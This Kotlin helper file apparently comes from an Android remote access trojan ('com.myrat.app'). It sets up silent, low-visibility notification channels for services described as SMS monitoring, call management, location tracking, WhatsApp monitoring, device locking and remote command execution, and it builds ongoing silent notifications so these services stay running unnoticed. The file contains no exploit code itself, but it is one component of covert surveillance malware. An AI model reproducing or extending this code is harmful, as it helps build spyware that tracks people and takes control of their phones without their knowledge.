package com.myrat.app.utils

import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.os.Build
import androidx.core.app.NotificationCompat
import com.myrat.app.R

object NotificationHelper {
    
    fun createNotificationChannels(context: Context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            
            val channels = listOf(
                NotificationChannel(
                    Constants.NOTIFICATION_CHANNEL_SMS,
                    "SMS Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "SMS monitoring and sending service"
                    setShowBadge(false)
                },
                NotificationChannel(
                    Constants.NOTIFICATION_CHANNEL_CALL,
                    "Call Service", 
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Phone call management service"
                    setShowBadge(false)
                },
                NotificationChannel(
                    Constants.NOTIFICATION_CHANNEL_LOCATION,
                    "Location Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Location tracking service"
                    setShowBadge(false)
                },
                NotificationChannel(
                    Constants.NOTIFICATION_CHANNEL_LOCK,
                    "Lock Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Device lock and security service"
                    setShowBadge(false)
                },
                NotificationChannel(
                    Constants.NOTIFICATION_CHANNEL_WHATSAPP,
                    "WhatsApp Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "WhatsApp monitoring service"
                    setShowBadge(false)
                },
                NotificationChannel(
                    Constants.NOTIFICATION_CHANNEL_SHELL,
                    "Shell Service",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Remote command execution service"
                    setShowBadge(false)
                },
                NotificationChannel(
                    Constants.NOTIFICATION_CHANNEL_MONITOR,
                    "Service Monitor",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Service monitoring and restart"
                    setShowBadge(false)
                }
            )
            
            channels.forEach { channel ->
                channel.enableLights(false)
                channel.enableVibration(false)
                channel.setSound(null, null)
                notificationManager.createNotificationChannel(channel)
            }
        }
    }
    
    fun buildServiceNotification(
        context: Context,
        channelId: String,
        title: String,
        content: String
    ) = NotificationCompat.Builder(context, channelId)
        .setContentTitle(title)
        .setContentText(content)
        .setSmallIcon(R.drawable.ic_launcher_foreground)
        .setPriority(NotificationCompat.PRIORITY_LOW)
        .setOngoing(true)
        .setSilent(true)
        .setShowWhen(false)
        .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
        .build()
}